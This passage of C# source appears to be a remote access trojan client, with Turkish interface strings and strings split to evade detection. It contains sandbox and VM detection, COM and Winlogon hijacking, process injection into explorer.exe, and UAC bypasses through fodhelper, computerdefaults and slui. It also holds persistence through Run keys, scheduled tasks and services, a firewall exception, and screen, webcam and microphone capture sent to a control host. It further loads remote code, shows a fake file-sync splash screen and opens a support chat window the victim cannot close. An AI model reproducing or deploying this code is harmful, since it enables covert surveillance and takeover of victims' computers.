                using (var k2 = Registry.LocalMachine.OpenSubKey(p2))
                {
                    if (k2 != null)
                    {
                        string s = (Convert.ToString(k2.GetValue(""SystemManufacturer"")) + "" "" + Convert.ToString(k2.GetValue(""SystemProductName""))).ToLower();
                        if (s.Contains(""vmware"") || s.Contains(""virtualbox"") || s.Contains(""qemu"") || s.Contains(""hyper-v"") || s.Contains(""virtual machine"")) return true;
                    }
                }

                string n1 = ""vbox"" + ""service"", n2 = ""vm"" + ""toolsd"", n3 = ""vm"" + ""srvc"", n4 = ""vbox"" + ""tray"";
                foreach (var p in Process.GetProcesses())
                {
                    try
                    {
                        string n = p.ProcessName.ToLower();
                        if (n == n1 || n == n2 || n == n3 || n == n4) return true;
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }

        static bool SmallBox()
        {
            try
            {
                if (Environment.ProcessorCount < 2) return true;
                if (new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory < 4000000000UL) return true;
                foreach (var d in DriveInfo.GetDrives())
                {
                    try
                    {
                        if (d.IsReady && d.Name.StartsWith(""C"")) return d.TotalSize < 80000000000L;
                    }
                    catch { }
                }
            }
            catch { }
            return false;
        }
#endif

        static void QuietDelay()
        {
            int ms = 15000 + new Random().Next(0, 15000);
            if (DELAY > ms) ms = DELAY;
            Thread.Sleep(ms);
        }

#if FEATURE_INSTALL
        static bool SamePath(string a, string b)
        {
            try { return string.Equals(Path.GetFullPath(a), Path.GetFullPath(b), StringComparison.OrdinalIgnoreCase); }
            catch { return false; }
        }

        static string TargetPath()
        {
            string dir = Environment.ExpandEnvironmentVariables(INSTALL_TO);
            string name = IS_DLL ? Path.GetFileName(SelfPath()) : EXE_NAME;
            if (string.IsNullOrEmpty(name)) name = EXE_NAME;
            return Path.Combine(dir, name);
        }
#endif

        static bool DetectDll()
        {
            try
            {
                string l = Assembly.GetExecutingAssembly().Location;
                return !string.IsNullOrEmpty(l) && l.EndsWith("".dll"", StringComparison.OrdinalIgnoreCase);
            }
            catch { return false; }
        }

        static string SelfPath()
        {
            try { string l = Assembly.GetExecutingAssembly().Location; if (!string.IsNullOrEmpty(l)) return l; } catch { }
            try { return Application.ExecutablePath; } catch { }
            try { return Process.GetCurrentProcess().MainModule.FileName; } catch { return """"; }
        }

        static bool Injected()
        {
            try { return Process.GetCurrentProcess().ProcessName.Equals(""explo"" + ""rer"", StringComparison.OrdinalIgnoreCase); }
            catch { return false; }
        }

#if FEATURE_COMHIJACK
        static void InstallComHijack()
        {
            try
            {
                string self = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;

                if (IS_DLL)
                {
                    string clsid = ""{BCDE0395-E52F-467C-8E3D-C4579291692E}"";
                    string root = ""Soft"" + ""ware\\Clas"" + ""ses\\CLSID\\"" + clsid + ""\\Inproc"" + ""Server32"";
                    using (var k = Registry.CurrentUser.CreateSubKey(root))
                    {
                        if (k != null)
                        {
                            k.SetValue("""", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), ""msco"" + ""ree.dll""));
                            k.SetValue(""ThreadingModel"", ""Both"");
                            k.SetValue(""Assembly"", Assembly.GetExecutingAssembly().FullName);
                            k.SetValue(""Class"", ""App.Service.ComHook"");
                            k.SetValue(""RuntimeVersion"", ""v4.0.30319"");
                        }
                    }
                }

                using (var k = Registry.CurrentUser.CreateSubKey(RUN_KEY))
                    if (k != null) k.SetValue(""MMDev"" + ""iceEnumerator"", Q(self));
            }
            catch { }
        }
#endif

#if FEATURE_WINLOGON
        static void InstallWinlogonHelper()
        {
            if (!IS_DLL) return;
            try
            {
                string root = ""SOFT"" + ""WARE\\Micro"" + ""soft\\Windows NT\\Current"" + ""Version\\Winlogon\\Notify\\crypt32"";
                using (var k = Registry.LocalMachine.CreateSubKey(root))
                {
                    if (k == null) return;
                    k.SetValue(""DllName"", string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED);
                    k.SetValue(""Logon"", ""1"", RegistryValueKind.String);
                    k.SetValue(""Lock"", ""1"", RegistryValueKind.String);
                }
            }
            catch { }
        }
#endif

#if FEATURE_INJECT
        static OpenProcessFn _fnOpen;
        static VirtualAllocExFn _fnAlloc;
        static WriteProcessMemoryFn _fnWrite;
        static CreateRemoteThreadFn _fnThread;
        static CloseHandleFn _fnClose;

        static void LoadNative()
        {
            if (_fnOpen != null) return;
            string k = ""ker"" + ""nel"" + ""32.dll"";
            _fnOpen = (OpenProcessFn)Api.Get(k, ""Open"" + ""Process"", typeof(OpenProcessFn));
            _fnAlloc = (VirtualAllocExFn)Api.Get(k, ""Virt"" + ""ual"" + ""Alloc"" + ""Ex"", typeof(VirtualAllocExFn));
            _fnWrite = (WriteProcessMemoryFn)Api.Get(k, ""Write"" + ""Process"" + ""Memory"", typeof(WriteProcessMemoryFn));
            _fnThread = (CreateRemoteThreadFn)Api.Get(k, ""Create"" + ""Remote"" + ""Thread"", typeof(CreateRemoteThreadFn));
            _fnClose = (CloseHandleFn)Api.Get(k, ""Close"" + ""Handle"", typeof(CloseHandleFn));
        }

        static bool AttachToExplorer()
        {
            IntPtr hp = IntPtr.Zero, addr = IntPtr.Zero, th = IntPtr.Zero;
            try
            {
                LoadNative();
                if (_fnOpen == null || _fnAlloc == null || _fnWrite == null || _fnThread == null || _fnClose == null) return false;

                Process target = null;
                foreach (var p in Process.GetProcessesByName(""explo"" + ""rer"")) { target = p; break; }
                if (target == null) return false;

                byte[] raw = File.ReadAllBytes(SelfPath());
                if (raw.Length < 0x100) return false;

                int peOff = BitConverter.ToInt32(raw, 0x3C);
                if (peOff <= 0 || peOff + 0x30 >= raw.Length) return false;
                int entryRva = BitConverter.ToInt32(raw, peOff + 0x28);
                int imageBase = BitConverter.ToInt32(raw, peOff + 0x34);

                hp = _fnOpen(0x1F0FFF, false, target.Id);
                if (hp == IntPtr.Zero) return false;

                addr = _fnAlloc(hp, (IntPtr)imageBase, (uint)raw.Length, 0x3000, 0x40);
                if (addr == IntPtr.Zero) addr = _fnAlloc(hp, IntPtr.Zero, (uint)raw.Length, 0x3000, 0x40);
                if (addr == IntPtr.Zero) return false;

                uint written;
                if (!_fnWrite(hp, addr, raw, (uint)raw.Length, out written)) return false;

                th = _fnThread(hp, IntPtr.Zero, 0, new IntPtr(addr.ToInt64() + entryRva), IntPtr.Zero, 0, IntPtr.Zero);
                if (th == IntPtr.Zero) return false;

                Thread.Sleep(600);
                return true;
            }
            catch { return false; }
            finally
            {
                if (th != IntPtr.Zero) { try { _fnClose(th); } catch { } }
                if (hp != IntPtr.Zero) { try { _fnClose(hp); } catch { } }
            }
        }
#endif

#if FEATURE_INSTALL
        static bool Install()
        {
            try
            {
                string dest = TargetPath();
                string dir = Path.GetDirectoryName(dest);
                if (string.IsNullOrEmpty(dir)) return false;
                Directory.CreateDirectory(dir);

                if (SamePath(dest, SelfPath())) { INSTALLED = dest; return false; }

                File.Copy(SelfPath(), dest, true);
                if (HIDE_FILE) Hide(dest);
                INSTALLED = dest;
                return true;
            }
            catch
            {
                INSTALLED = SelfPath();
                return false;
            }
        }
#endif

#if FEATURE_ELEVATE
        static bool Marked()
        {
            try
            {
                using (var k = Registry.CurrentUser.OpenSubKey(REG_ROOT))
                    return k != null && Convert.ToString(k.GetValue(""Elev"")) == ""1"";
            }
            catch { return false; }
        }

        static void Mark()
        {
            try
            {
                using (var k = Registry.CurrentUser.CreateSubKey(REG_ROOT))
                    if (k != null) k.SetValue(""Elev"", ""1"", RegistryValueKind.String);
            }
            catch { }
        }

        static void Unmark()
        {
            try
            {
                using (var k = Registry.CurrentUser.OpenSubKey(REG_ROOT, true))
                    if (k != null) k.DeleteValue(""Elev"", false);
            }
            catch { }
        }
#endif

        static void ReleaseMutexOnce()
        {
            var m = MX;
            MX = null;
            if (m == null) return;
            try { m.ReleaseMutex(); } catch { }
            try { m.Dispose(); } catch { }
        }

#if FEATURE_ELEVATE
        static bool SpawnElevated()
        {
            try
            {
                string target = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;
                if (!File.Exists(target)) return false;

                var psi = new ProcessStartInfo
                {
                    FileName = target,
                    Arguments = ""--e"",
                    Verb = ""ru"" + ""nas"",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                try { Process.Start(psi); return true; } catch { return false; }
            }
            catch { return false; }
        }

        static bool WaitAdmin()
        {
            for (int i = 0; i < 12; i++)
            {
                Thread.Sleep(500);
                if (IsAdmin()) return true;
            }
            return false;
        }

        static bool TryFodHelper()
        {
            string root = ""Soft"" + ""ware\\Clas"" + ""ses\\ms-"" + ""settings\\Shell\\Open\\com"" + ""mand"";
            try
            {
                string target = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;
                if (!File.Exists(target)) return false;

                using (var k = Registry.CurrentUser.CreateSubKey(root))
                {
                    if (k == null) return false;
                    k.SetValue("""", Q(target) + "" --e"");
                    k.SetValue(""Delegate"" + ""Execute"", """", RegistryValueKind.String);
                }

                Process.Start(new ProcessStartInfo(""fod"" + ""helper.exe"") { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden });
                Thread.Sleep(3200);
                return true;
            }
            catch { return false; }
            finally { try { Registry.CurrentUser.DeleteSubKeyTree(""Soft"" + ""ware\\Clas"" + ""ses\\ms-"" + ""settings"", false); } catch { } }
        }

        static bool TryComputerDefaults()
        {
            string root = ""Soft"" + ""ware\\Clas"" + ""ses\\msc"" + ""file\\shell\\open\\com"" + ""mand"";
            try
            {
                string target = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;
                if (!File.Exists(target)) return false;

                using (var k = Registry.CurrentUser.CreateSubKey(root))
                {
                    if (k == null) return false;
                    k.SetValue("""", Q(target) + "" --e"");
                }

                Process.Start(new ProcessStartInfo(""compu"" + ""terdefaults.exe"") { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden });
                Thread.Sleep(3200);
                return true;
            }
            catch { return false; }
            finally { try { Registry.CurrentUser.DeleteSubKeyTree(""Soft"" + ""ware\\Clas"" + ""ses\\msc"" + ""file"", false); } catch { } }
        }

        static bool TrySlui()
        {
            string root = ""Soft"" + ""ware\\Clas"" + ""ses\\exe"" + ""file\\shell\\run"" + ""as\\com"" + ""mand"";
            try
            {
                string target = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;
                if (!File.Exists(target)) return false;

                using (var k = Registry.CurrentUser.CreateSubKey(root))
                {
                    if (k == null) return false;
                    k.SetValue("""", Q(target) + "" --e"");
                }

                Process.Start(new ProcessStartInfo(""sl"" + ""ui.exe"", ""4"") { UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden });
                Thread.Sleep(3200);
                return true;
            }
            catch { return false; }
            finally { try { Registry.CurrentUser.DeleteSubKeyTree(""Soft"" + ""ware\\Clas"" + ""ses\\exe"" + ""file"", false); } catch { } }
        }

        static bool AskElevate()
        {
            if (IS_DLL) return false;
            if (IsAdmin()) return false;

            if (TryFodHelper()) { if (WaitAdmin()) return true; }
            if (TryComputerDefaults()) { if (WaitAdmin()) return true; }
            if (TrySlui()) { if (WaitAdmin()) return true; }
            return SpawnElevated();
        }

        static void ElevateNow()
        {
            if (IsAdmin()) { Send(""INFO|Zaten yönetici.""); return; }
            if (AskElevate()) { Mark(); ReleaseMutexOnce(); Environment.Exit(0); }
            Send(""INFO|Yükseltme reddedildi."");
        }

        static void GrantRights()
        {
            try
            {
                string exe = SelfPath();
                string dir = Path.GetDirectoryName(exe);
                Run(""ic"" + ""acls"", Q(exe) + "" /grant *S-1-5-32-544:F /C /Q"");
                if (!string.IsNullOrEmpty(dir)) Run(""ic"" + ""acls"", Q(dir) + "" /grant *S-1-5-32-544:(OI)(CI)F /T /C /Q"");
            }
            catch { }
        }
#endif

#if FEATURE_PERSIST
        static void AutostartElevated()
        {
            if (AUTOSTART == ""Yok"") return;
            ELEV_AUTOSTART = true;
            try
            {
                using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true))
                    if (k != null) k.DeleteValue(RUN_NAME, false);
            }
            catch { }
        }

        static void Autostart()
        {
            string exe = string.IsNullOrEmpty(INSTALLED) ? SelfPath() : INSTALLED;
            try
            {
                string sch = ""sch"" + ""ta"" + ""sks"";

                if (ELEV_AUTOSTART)
                {
                    Run(sch, ""/create /sc onlogon /tn "" + Q(TASK_NAME) + "" /tr "" + Q(exe) + "" /rl highest /f"");
                    return;
                }

                using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true))
                    if (k != null) k.SetValue(RUN_NAME, Q(exe));

                switch (AUTOSTART)
                {
                    case ""Startup"":
                        {
                            string lnk = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RUN_NAME + "".lnk"");
                            Type t = Type.GetTypeFromProgID(""WScript."" + ""Shell"");
                            dynamic sh = Activator.CreateInstance(t);
                            dynamic s = sh.CreateShortcut(lnk);
                            s.TargetPath = exe;
                            s.WorkingDirectory = Path.GetDirectoryName(exe);
                            s.WindowStyle = 7;
                            s.Save();
                            break;
                        }
                    case ""Task"":
                        Run(sch, ""/create /sc onlogon /tn "" + Q(TASK_NAME) + "" /tr "" + Q(exe) + "" /rl highest /f"");
                        break;
                    case ""Boot"":
                        Run(sch, ""/create /sc onst"" + ""art /tn "" + Q(TASK_NAME) + "" /tr "" + Q(exe) + "" /rl highest /f"");
                        break;
                    case ""Service"":
                        Run(""s"" + ""c"", ""create "" + TASK_NAME + "" binPath= "" + Q(exe) + "" st"" + ""art= auto"");
                        Run(""s"" + ""c"", ""st"" + ""art "" + TASK_NAME);
                        break;
                }
            }
            catch { }
        }

        static void Firewall()
        {
            try
            {
                Run(""ne"" + ""tsh"", ""advfire"" + ""wall firewall add rule name="" + Q(RUN_NAME) + "" dir=in action=allow program="" + Q(SelfPath()) + "" enable=yes"");
            }
            catch { }
        }
#endif

        static void Splash()
        {
            if (UNATTENDED) return;

            var th = new Thread(() =>
            {
                try
                {
                    if (!UNATTENDED) Application.EnableVisualStyles();

                    var f = new Form
                    {
                        FormBorderStyle = FormBorderStyle.None,
                        StartPosition = FormStartPosition.CenterScreen,
                        Size = new Size(430, 250),
                        BackColor = Color.FromArgb(250, 250, 252),
                        ForeColor = Color.FromArgb(40, 44, 52),
                        Text = RUN_NAME,
                        ShowInTaskbar = true,
                        Font = new Font(""Segoe UI"", 9f)
                    };

                    var head = new Panel { Dock = DockStyle.Top, Height = 44, BackColor = Color.FromArgb(0, 120, 212) };
                    head.Controls.Add(new Label
                    {
                        Text = ""    "" + RUN_NAME,
                        Dock = DockStyle.Fill,
                        TextAlign = ContentAlignment.MiddleLeft,
                        Font = new Font(""Segoe UI"", 10f, FontStyle.Bold),
                        ForeColor = Color.White
                    });
                    var x = new Label { Text = ""✕"", Dock = DockStyle.Right, Width = 44, TextAlign = ContentAlignment.MiddleCenter, ForeColor = Color.White, Cursor = Cursors.Hand };
                    x.Click += (s2, e2) => f.Close();
                    head.Controls.Add(x);

                    var info = new Label
                    {
                        Left = 22,
                        Top = 60,
                        Width = 386,
                        Height = 92,
                        ForeColor = Color.FromArgb(80, 84, 92),
                        Font = new Font(""Segoe UI"", 8.5f),
                        Text = ""Dosyalarınız senkronize ediliyor...\r\n"" +
                               Environment.MachineName + "" • "" + Environment.UserName + ""\r\n"" +
                               DateTime.Now.ToString(""dd.MM.yyyy HH:mm"")
                    };

                    var bar = new ProgressBar { Left = 22, Top = 168, Width = 386, Height = 8, Style = ProgressBarStyle.Marquee, MarqueeAnimationSpeed = 26 };
                    var foot = new Label { Text = ""Arka planda çalışmaya devam ediyor."", Left = 22, Top = 186, Width = 386, Height = 18, ForeColor = Color.Gray };

                    f.Controls.Add(head);
                    f.Controls.Add(info);
                    f.Controls.Add(bar);
                    f.Controls.Add(foot);

                    var tm = new System.Windows.Forms.Timer { Interval = 5200 };
                    tm.Tick += (s2, e2) => { tm.Stop(); f.Close(); };
                    f.Shown += (s2, e2) => tm.Start();

                    bool drag = false;
                    Point p0 = Point.Empty;
                    head.MouseDown += (s2, e2) => { drag = true; p0 = e2.Location; };
                    head.MouseMove += (s2, e2) => { if (drag) f.Location = new Point(f.Left + e2.X - p0.X, f.Top + e2.Y - p0.Y); };
                    head.MouseUp += (s2, e2) => drag = false;

                    Application.Run(f);
                }
                catch { }
            });
            th.SetApartmentState(ApartmentState.STA);
            th.IsBackground = true;
            th.Start();
        }

#if FEATURE_RD || FEATURE_WEBCAM
        static ImageCodecInfo JpegCodec()
        {
            if (JPEG != null) return JPEG;
            foreach (var c in ImageCodecInfo.GetImageEncoders())
                if (c.FormatID == ImageFormat.Jpeg.Guid) { JPEG = c; break; }
            return JPEG;
        }

        static void Jpeg(Bitmap b, Stream ms, int quality)
        {
            var codec = JpegCodec();
            if (codec == null) { b.Save(ms, ImageFormat.Jpeg); return; }
            using (var cp = new EncoderParameters(1))
            {
                cp.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
                b.Save(ms, codec, cp);
            }
        }
#endif

#if FEATURE_RD
        static void ReleaseCache()
        {
            try { if (TDc != IntPtr.Zero) DeleteDC(TDc); } catch { }
            TDc = IntPtr.Zero;
            if (TFull != null) { try { TFull.Dispose(); } catch { } TFull = null; }
            if (TSmall != null) { try { TSmall.Dispose(); } catch { } TSmall = null; }
            TRect = Rectangle.Empty;
        }

        static Bitmap Grab(int monitor, double scale)
        {
            Rectangle b;
            try
            {
                var screens = Screen.AllScreens;
                if (monitor < 0) b = SystemInformation.VirtualScreen;
                else if (monitor < screens.Length) b = screens[monitor].Bounds;
                else b = Screen.PrimaryScreen.Bounds;
            }
            catch { b = Screen.PrimaryScreen.Bounds; }

            if (b.Width < 1) b = new Rectangle(b.X, b.Y, 1, Math.Max(1, b.Height));
            if (b.Height < 1) b = new Rectangle(b.X, b.Y, Math.Max(1, b.Width), 1);

            double s = Math.Min(1.0, Math.Max(0.15, scale));
            int nw = Math.Max(1, (int)(b.Width * s));
            int nh = Math.Max(1, (int)(b.Height * s));

            if (TFull == null || TRect != b)
            {
                ReleaseCache();
                TDc = CreateDC(""DISPLAY"", null, null, IntPtr.Zero);
                TRect = b;
                TFull = new Bitmap(b.Width, b.Height, PixelFormat.Format32bppArgb);
            }

            try
            {
                using (var g = Graphics.FromImage(TFull))
                {
                    IntPtr dst = g.GetHdc();
                    BitBlt(dst, 0, 0, b.Width, b.Height, TDc, b.X, b.Y, SRCCOPY);
                    g.ReleaseHdc(dst);
                }
            }
            catch { return TFull; }

            if (nw == b.Width && nh == b.Height) return TFull;

            if (TSmall == null || TSmall.Width != nw || TSmall.Height != nh)
            {
                if (TSmall != null) { try { TSmall.Dispose(); } catch { } }
                TSmall = new Bitmap(nw, nh, PixelFormat.Format32bppArgb);
            }

            using (var g = Graphics.FromImage(TSmall))
            {
                g.InterpolationMode = InterpolationMode.HighQualityBilinear;
                g.PixelOffsetMode = PixelOffsetMode.HighQuality;
                g.DrawImage(TFull, new Rectangle(0, 0, nw, nh));
            }

            return TSmall;
        }

        static void ShotOnce()
        {
            var t = new Thread(() =>
            {
                try
                {
                    Bitmap bmp = Grab(-1, 1400.0 / Math.Max(1, SystemInformation.VirtualScreen.Width));
                    using (var ms = new MemoryStream(256 * 1024))
                    {
                        Jpeg(bmp, ms, 68);
                        Send(""SHOT|"" + bmp.Width + ""|"" + bmp.Height + ""|"" + Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length));
                    }
                }
                catch { }
                finally { ReleaseCache(); }
            });
            t.IsBackground = true;
            t.Start();
        }

        static void RdLoop(int g)
        {
            var ms = new MemoryStream(256 * 1024);
            try
            {
                while (alive && GEN == g && rdRun)
                {
                    int t0 = Environment.TickCount;
                    try
                    {
                        Bitmap bmp = Grab(rdMonitor, rdScale);
                        ms.SetLength(0);
                        Jpeg(bmp, ms, 55);
                        Send(""IMG|"" + bmp.Width + ""|"" + bmp.Height + ""|"" + Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length));
                    }
                    catch { }

                    int spent = unchecked(Environment.TickCount - t0);
                    int wait = 130 - spent;
                    if (wait > 0) Thread.Sleep(wait);
                    else if (wait < -80) Thread.Sleep(8);
                }
            }
            finally { ReleaseCache(); }
        }
#endif

        static void HeartLoop(int g)
        {
            int limit = Math.Max(15000, HEART);
            while (alive && GEN == g)
            {
                Thread.Sleep(1000);
                if (!alive || GEN != g) break;
                int idle = unchecked(Environment.TickCount - LAST_SEND);
                if (idle >= limit) Send(""PING"");
            }
        }

#if FEATURE_MEMORY
        static void LoaderPing(int g)
        {
            while (alive && GEN == g)
            {
                Thread.Sleep(60000);
                if (!alive || GEN != g) break;
                try
                {
                    byte[] bin = LoaderReq();
                    if (bin == null || bin.Length == 0) continue;
                    Assembly asm = Assembly.Load(bin);
                    Type t = asm.GetType(""App.Service.ComHook"");
                    if (t == null) continue;
                    Activator.CreateInstance(t);
                }
                catch { }
            }
        }

        static byte[] LoaderReq()
        {
            try
            {
                using (var c = new TcpClient())
                {
                    c.Connect(HOST, PORT);
                    c.ReceiveTimeout = 15000;
                    var ns = c.GetStream();

                    byte[] req = Encoding.UTF8.GetBytes(""LOADER|PING"");
                    ns.Write(req, 0, req.Length);
                    ns.Flush();

                    byte[] h = new byte[4];
                    int r = 0;
                    while (r < 4) { int x = ns.Read(h, r, 4 - r); if (x <= 0) return null; r += x; }
                    int len = BitConverter.ToInt32(h, 0);
                    if (len <= 0 || len > MAXFRAME) return null;

                    byte[] body = new byte[len];
                    r = 0;
                    while (r < len) { int x = ns.Read(body, r, len - r); if (x <= 0) return null; r += x; }

                    string resp = Encoding.UTF8.GetString(body);
                    if (resp.StartsWith(""LOADER|BIN|"")) return Convert.FromBase64String(resp.Substring(11));
                    return null;
                }
            }
            catch { return null; }
        }
#endif

#if FEATURE_WEBCAM
        static CapCreateFn _fnCap;

        static void CamShot()
        {
            var t = new Thread(() =>
            {
                IntPtr h = IntPtr.Zero;
                bool connected = false;
                try
                {
                    if (_fnCap == null)
                        _fnCap = (CapCreateFn)Api.Get(""avi"" + ""cap"" + ""32.dll"", ""capCreate"" + ""Capture"" + ""WindowA"", typeof(CapCreateFn));
                    if (_fnCap == null) { Send(""CAM_ERR|Kamera kütüphanesi yok.""); return; }

                    h = _fnCap(""c11kcap"", unchecked((int)0x80000000), 0, 0, 640, 480, IntPtr.Zero, 0);
                    if (h == IntPtr.Zero) { Send(""CAM_ERR|Kamera penceresi oluşturulamadı.""); return; }

                    if (!SendMessage(h, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero))
                    {
                        Send(""CAM_ERR|Kamera açılamadı. Cihaz yok veya başka uygulama kullanıyor."");
                        return;
                    }
                    connected = true;

                    SendMessage(h, WM_CAP_SET_SCALE, (IntPtr)1, IntPtr.Zero);
                    SendMessage(h, WM_CAP_SET_PREVIEWRATE, (IntPtr)66, IntPtr.Zero);
                    SendMessage(h, WM_CAP_SET_PREVIEW, (IntPtr)1, IntPtr.Zero);
                    Thread.Sleep(1200);

                    for (int i = 0; i < 3; i++)
                    {
                        SendMessage(h, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                        Thread.Sleep(250);
                    }
                    SendMessage(h, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);
                    Thread.Sleep(400);

                    if (Clipboard.ContainsImage())
                    {
                        using (var img = Clipboard.GetImage())
                        {
                            if (img != null)
                            {
                                using (var bmp = new Bitmap(img))
                                using (var ms = new MemoryStream())
                                {
                                    Jpeg(bmp, ms, 78);
                                    Send(""CAM_IMG|"" + Convert.ToBase64String(ms.ToArray()));
                                }
                            }
                            else Send(""CAM_ERR|Görüntü boş."");
                        }
                    }
                    else Send(""CAM_ERR|Kare alınamadı."");
                }
                catch (Exception ex) { Send(""CAM_ERR|"" + ex.Message); }
                finally
                {
                    if (h != IntPtr.Zero)
                    {
                        if (connected) { try { SendMessage(h, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch { } }
                        try { DestroyWindow(h); } catch { }
                    }
                }
            });
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }
#endif

#if FEATURE_AUDIO
        static void MicRec(int ms)
        {
            var t = new Thread(() =>
            {
                string file = WorkFile("".wav"");
                try
                {
                    var sb = new StringBuilder(64);
                    if (mciSendString(""open new type wave"" + ""audio alias c11krec"", sb, 64, IntPtr.Zero) != 0)
                    {
                        Send(""AUDIO_ERR|Kayıt cihazı açılamadı."");
                        return;
                    }
                    mciSendString(""set c11krec time format ms bits"" + ""persample 16 channels 1 samples"" + ""persec 22050"", null, 0, IntPtr.Zero);
                    mciSendString(""rec"" + ""ord c11krec"", null, 0, IntPtr.Zero);
                    Thread.Sleep(Math.Max(1000, Math.Min(60000, ms)));
                    mciSendString(""st"" + ""op c11krec"", null, 0, IntPtr.Zero);
                    mciSendString(""save c11krec "" + Q(file), null, 0, IntPtr.Zero);
                    mciSendString(""close c11krec"", null, 0, IntPtr.Zero);

                    if (File.Exists(file))
                    {
                        byte[] data = File.ReadAllBytes(file);
                        Send(""AUDIO_DATA|"" + Convert.ToBase64String(data));
                    }
                    else Send(""AUDIO_ERR|Kayıt dosyası oluşmadı."");
                }
                catch (Exception ex) { Send(""AUDIO_ERR|"" + ex.Message); }
                finally
                {
                    mciSendString(""close c11krec"", null, 0, IntPtr.Zero);
                    try { if (File.Exists(file)) File.Delete(file); } catch { }
                }
            });
            t.IsBackground = true;
            t.Start();
        }
#endif

#if FEATURE_CHAT
        static void ChatOpen(string op)
        {
            CHATOP = string.IsNullOrEmpty(op) ? ""Operatör"" : op;

            if (CHATF != null && !CHATF.IsDisposed)
            {
                try { CHATF.BeginInvoke((MethodInvoker)delegate { try { CHATF.Activate(); } catch { } }); } catch { }
                return;
            }
            if (CHATSTART) return;
            CHATSTART = true;

            var t = new Thread(() =>
            {
                try
                {
                    var f = new Form
                    {
                        FormBorderStyle = FormBorderStyle.None,
                        Size = new Size(474, 548),
                        StartPosition = FormStartPosition.CenterScreen,
                        BackColor = Color.FromArgb(17, 19, 25),
                        ForeColor = Color.White,
                        Font = new Font(""Segoe UI"", 9f),
                        ShowInTaskbar = true,
                        Text = ""Destek"",
                        MaximizeBox = false,
                        MinimizeBox = false
                    };

                    f.Paint += (s, e) =>
                    {
                        using (var p = new Pen(Color.FromArgb(54, 62, 80))) e.Graphics.DrawRectangle(p, 0, 0, f.Width - 1, f.Height - 1);
                    };

                    var head = new Panel { Dock = DockStyle.Top, Height = 46, BackColor = Color.FromArgb(26, 31, 42) };
                    var hl = new Label
                    {
                        Text = ""Destek  •  "" + CHATOP,
                        Dock = DockStyle.Fill,
                        TextAlign = ContentAlignment.MiddleLeft,
                        Padding = new Padding(14, 0, 0, 0),
                        Font = new Font(""Segoe UI"", 9f, FontStyle.Bold),
                        ForeColor = Color.FromArgb(130, 175, 255),
                        BackColor = Color.Transparent
                    };
                    var hr = new Label
                    {
                        Text = ""canlı"",
                        Dock = DockStyle.Right,
                        Width = 54,
                        TextAlign = ContentAlignment.MiddleCenter,
                        Font = new Font(""Segoe UI"", 7.5f),
                        ForeColor = Color.FromArgb(110, 120, 140),
                        BackColor = Color.Transparent
                    };
                    head.Controls.Add(hl);
                    head.Controls.Add(hr);

                    bool drag = false; Point d0 = Point.Empty;
                    MouseEventHandler dn = (s, e) => { drag = true; d0 = e.Location; };
                    MouseEventHandler mv = (s, e) => { if (drag) f.Location = new Point(f.Left + e.X - d0.X, f.Top + e.Y - d0.Y); };
                    MouseEventHandler up = (s, e) => drag = false;
                    head.MouseDown += dn; head.MouseMove += mv; head.MouseUp += up;
                    hl.MouseDown += dn; hl.MouseMove += mv; hl.MouseUp += up;

                    var log = new TextBox
                    {
                        Multiline = true,
                        ReadOnly = true,
                        Dock = DockStyle.Fill,
                        ScrollBars = ScrollBars.Vertical,
                        BackColor = Color.FromArgb(21, 24, 31),
                        ForeColor = Color.Gainsboro,
                        BorderStyle = BorderStyle.None,
                        Font = new Font(""Segoe UI"", 9f)
                    };

                    var bar = new Panel { Dock = DockStyle.Bottom, Height = 48, BackColor = Color.FromArgb(26, 31, 42), Padding = new Padding(7) };
                    var inp = new TextBox { Dock = DockStyle.Fill, BorderStyle = BorderStyle.None, BackColor = Color.FromArgb(36, 42, 53), ForeColor = Color.White, Font = new Font(""Segoe UI"", 9f) };
                    var btn = new Button { Dock = DockStyle.Right, Width = 86, Text = ""Gönder"", FlatStyle = FlatStyle.Flat, BackColor = Color.FromArgb(64, 120, 255), ForeColor = Color.White, Font = new Font(""Segoe UI"", 8.5f, FontStyle.Bold) };
                    btn.FlatAppearance.BorderSize = 0;

                    bar.Controls.Add(inp);
                    bar.Controls.Add(btn);
                    f.Controls.Add(head);
                    f.Controls.Add(bar);
                    f.Controls.Add(log);

                    Action push = () =>
                    {
                        string m = inp.Text.Trim();
                        if (m.Length == 0) return;
                        inp.Clear();
                        log.AppendText(""Ben: "" + m + ""\r\n"");
                        log.SelectionStart = log.Text.Length;
                        log.ScrollToCaret();
                        Send(""CHAT|MSG|"" + B64(m));
                    };

                    btn.Click += (s, e) => push();
                    inp.KeyDown += (s, e) => { if (e.KeyCode == System.Windows.Forms.Keys.Enter) { e.SuppressKeyPress = true; push(); } };

                    f.FormClosing += (s, e) => { if (!CHATFORCE) e.Cancel = true; };
                    f.FormClosed += (s, e) =>
                    {
                        CHATF = null;
                        CHATLOG = null;
                        CHATFORCE = false;
                        CHATSTART = false;
                    };

                    CHATF = f;
                    CHATLOG = log;
                    log.AppendText(""Destek ekibi bağlandı ("" + CHATOP + "").\r\nBu pencere sizin tarafınızdan kapatılamaz.\r\n\r\n"");
                    Application.Run(f);
                }
